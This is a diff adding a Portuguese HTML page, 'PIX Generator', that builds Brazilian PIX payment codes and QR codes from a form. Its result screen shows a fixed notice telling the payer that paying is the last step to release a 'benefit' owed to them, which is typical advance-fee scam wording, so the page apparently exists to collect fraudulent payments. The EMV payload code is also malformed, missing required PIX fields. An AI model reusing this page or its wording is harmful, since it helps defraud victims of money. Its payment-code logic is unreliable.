@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIX Generator - Gerador de PIX e QR Code</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 2.2rem;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .header p {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        .form-section {
+            display: block;
+        }
+
+        .form-section.hidden {
+            display: none;
+        }
+
+        .result-section {
+            display: none;
+            text-align: center;
+        }
+
+        .result-section.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #4a5568;
+            font-size: 14px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #8b5cf6;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
+        }
+
+        .form-textarea {
+            resize: vertical;
+            min-height: 80px;
+            font-family: inherit;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px 20px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #8b5cf6, #a855f7);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #7c3aed, #9333ea);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(139, 92, 246, 0.3);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, #8b5cf6, #a855f7);
+            color: white;
+            margin-top: 15px;
+        }
+
+        .btn-secondary:hover {
+            background: linear-gradient(135deg, #7c3aed, #9333ea);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(139, 92, 246, 0.3);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .important-notice {
+            background: linear-gradient(135deg, #8b5cf6, #a855f7);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .important-notice strong {
+            font-weight: 700;
+        }
+
+        .qr-container {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            border: 2px solid #e2e8f0;
+            margin-bottom: 20px;
+        }
+
+        .qr-code {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .qr-code canvas {
+            border-radius: 10px;
+        }
+
+        .pix-code-section {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .pix-code-label {
+            font-size: 12px;
+            color: #6b7280;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .pix-code-content {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            word-break: break-all;
+            color: #374151;
+            line-height: 1.4;
+        }
+
+        .copy-instruction {
+            font-size: 13px;
+            color: #6b7280;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #6b7280;
+            margin-top: 20px;
+        }
+
+        .security-icon {
+            width: 16px;
+            height: 16px;
+            color: #10b981;
+        }
+
+        .back-btn {
+            background: #6b7280;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background: #4b5563;
+        }
+
+        .success-message {
+            background: #dcfce7;
+            border: 1px solid #bbf7d0;
+            color: #166534;
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 10px;
+            }
+
+            .card {
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🏦 PIX Generator</h1>
+            <p>Gerador profissional de PIX e QR Code</p>
+        </div>
+
+        <div class="card">
+            <!-- Formulário -->
+            <div class="form-section" id="formSection">
+                <form id="pixForm">
+                    <div class="form-group">
+                        <label class="form-label">💰 Valor (R$)</label>
+                        <input type="number" class="form-input" id="amount" name="amount" placeholder="0,00" step="0.01" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">👤 Nome do Beneficiário</label>
+                        <input type="text" class="form-input" id="recipient" name="recipient" placeholder="Nome completo do beneficiário" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">🔑 Chave PIX</label>
+                        <input type="text" class="form-input" id="pixKey" name="pixKey" placeholder="CPF, e-mail, telefone ou chave aleatória" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">📝 Descrição (opcional)</label>
+                        <textarea class="form-input form-textarea" id="description" name="description" placeholder="Descrição do pagamento"></textarea>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">🏪 Cidade</label>
+                        <input type="text" class="form-input" id="city" name="city" placeholder="Cidade do beneficiário" required>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary" id="generateBtn">
+                        <span id="generateText">Gerar PIX</span>
+                        <div id="loadingSpinner" class="loading-spinner" style="display: none;"></div>
+                    </button>
+                </form>
+            </div>
+
+            <!-- Resultado -->
+            <div class="result-section" id="resultSection">
+                <button class="back-btn" onclick="goBack()">← Voltar</button>
+                
+                <div class="important-notice">
+                    <strong>IMPORTANTE:</strong> Efetue o pagamento via Pix dentro do prazo estipulado para que possamos <strong>liberar seu benefício sem atrasos</strong>. Este é o último passo para assegurar o valor que é seu por direito.
+                </div>
+
+                <div class="qr-container">
+                    <div class="qr-code" id="qrCode"></div>
+                </div>
+
+                <div class="pix-code-section">
+                    <div class="pix-code-label">Código PIX para cópia</div>
+                    <div class="pix-code-content" id="pixCodeContent"></div>
+                </div>
+
+                <div class="copy-instruction">
+                    Clique no QR Code ou no botão abaixo para copiar
+                </div>
+
+                <button class="btn btn-secondary" onclick="copyPixCode()">
+                    📋 COPIAR CÓDIGO PIX
+                </button>
+
+                <div class="security-info">
+                    <svg class="security-icon" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+                    </svg>
+                    <span>Pagamento 100% Seguro • Dados Protegidos</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let generatedPixCode = '';
+
+        // Formulário de PIX
+        document.getElementById('pixForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            generatePix();
+        });
+
+        function generatePix() {
+            const generateBtn = document.getElementById('generateBtn');
+            const generateText = document.getElementById('generateText');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+
+            // Mostrar loading
+            generateBtn.disabled = true;
+            generateText.style.display = 'none';
+            loadingSpinner.style.display = 'block';
+
+            // Obter dados do formulário
+            const formData = new FormData(document.getElementById('pixForm'));
+            const amount = formData.get('amount');
+            const recipient = formData.get('recipient');
+            const pixKey = formData.get('pixKey');
+            const description = formData.get('description') || '';
+            const city = formData.get('city');
+
+            // Simular geração do PIX
+            setTimeout(() => {
+                // Gerar código PIX
+                generatedPixCode = generatePixCode(amount, recipient, pixKey, description, city);
+                
+                // Mostrar código PIX
+                document.getElementById('pixCodeContent').textContent = generatedPixCode;
+                
+                // Gerar QR Code
+                generateQRCode(generatedPixCode);
+                
+                // Mostrar seção de resultado
+                document.getElementById('formSection').classList.add('hidden');
+                document.getElementById('resultSection').classList.add('active');
+
+                // Resetar botão
+                generateBtn.disabled = false;
+                generateText.style.display = 'block';
+                loadingSpinner.style.display = 'none';
+            }, 2000);
+        }
+
+        function generatePixCode(amount, recipient, pixKey, description, city) {
+            // Geração simplificada do código PIX (seguindo especificação EMV)
+            const payload = {
+                version: '01',
+                initiation: '11', // Estático
+                merchantInfo: `26${pixKey.length.toString().padStart(2, '0')}${pixKey}`,
+                merchantCategory: '0000',
+                currency: '5303986', // BRL
+                amount: amount ? `54${amount.length.toString().padStart(2, '0')}${amount}` : '',
+                country: '5802BR',
+                merchantName: `59${recipient.length.toString().padStart(2, '0')}${recipient}`,
+                merchantCity: `60${city.length.toString().padStart(2, '0')}${city}`,
+                txid: description ? `62${(description.length + 4).toString().padStart(2, '0')}05${description.length.toString().padStart(2, '0')}${description}` : '6204',
+                crc: '6304'
+            };
+
+            const pixString = Object.values(payload).join('');
+            
+            // Calcular CRC16 simplificado (para demonstração)
+            const crc = calculateCRC16(pixString);
+            
+            return pixString + crc.toString(16).toUpperCase().padStart(4, '0');
+        }
+
+        function calculateCRC16(data) {
+            // CRC16 simplificado para demonstração
+            let crc = 0xFFFF;
+            for (let i = 0; i < data.length; i++) {
+                crc ^= data.charCodeAt(i) << 8;
+                for (let j = 0; j < 8; j++) {
+                    if (crc & 0x8000) {
+                        crc = (crc << 1) ^ 0x1021;
+                    } else {
+                        crc <<= 1;
+                    }
+                    crc &= 0xFFFF;
+                }
+            }
+            return crc;
+        }
+
+        function generateQRCode(pixCode) {
+            const qrContainer = document.getElementById('qrCode');
+            qrContainer.innerHTML = '';
+            
+            QRCode.toCanvas(pixCode, {
+                width: 200,
+                height: 200,
+                margin: 2,
+                color: {
+                    dark: '#000000',
+                    light: '#FFFFFF'
+                }
+            }, function (error, canvas) {
+                if (error) {
+                    console.error('Erro ao gerar QR Code:', error);
+                    qrContainer.innerHTML = '<div style="width: 200px; height: 200px; background: #f3f4f6; border: 2px dashed #d1d5db; display: flex; align-items: center; justify-content: center; border-radius: 10px;">❌ Erro ao gerar QR</div>';
+                } else {
+                    canvas.style.cursor = 'pointer';
+                    canvas.onclick = copyPixCode;
+                    qrContainer.appendChild(canvas);
+                }
+            });
+        }
+
+        function copyPixCode() {
+            if (generatedPixCode) {
+                navigator.clipboard.writeText(generatedPixCode).then(() => {
+                    showSuccess('Código PIX copiado com sucesso!');
+                }).catch(() => {
+                    // Fallback para navegadores mais antigos
+                    const textArea = document.createElement('textarea');
+                    textArea.value = generatedPixCode;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                    showSuccess('Código PIX copiado com sucesso!');
+                });
+            }
+        }
+
+        function goBack() {
+            document.getElementById('resultSection').classList.remove('active');
+            document.getElementById('formSection').classList.remove('hidden');
+        }
+
+        function showSuccess(message) {
+            const existingMessage = document.querySelector('.success-message');
+            if (existingMessage) {
+                existingMessage.remove();
+            }
+
+            const successMessage = document.createElement('div');
+            successMessage.className = 'success-message';
+            successMessage.innerHTML = `
+                <span>✅</span>
+                <span>${message}</span>
+            `;
+            
+            const resultSection = document.getElementById('resultSection');
+            resultSection.insertBefore(successMessage, resultSection.firstChild);
+            
+            setTimeout(() => {
+                successMessage.remove();
+            }, 3000);
+        }
+
+        // Formatação automática de valores
+        document.getElementById('amount').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value) {
+                value = (parseInt(value) / 100).toFixed(2);
+                e.target.value = value;
+            }
+        });
+
+        // Formatação de chave PIX
+        document.getElementById('pixKey').addEventListener('input', function(e) {
+            let value = e.target.value;
+            
+            // Se parece com CPF
+            if (/^\d+$/.test(value) && value.length <= 11) {
+                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                e.target.value = value;
+            }
+            
+            // Se parece com telefone
+            if (/^\d+$/.test(value) && value.length > 11) {
+                value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+                e.target.value = value;
+            }
+        });
+    </script>
+</body>
+</html>
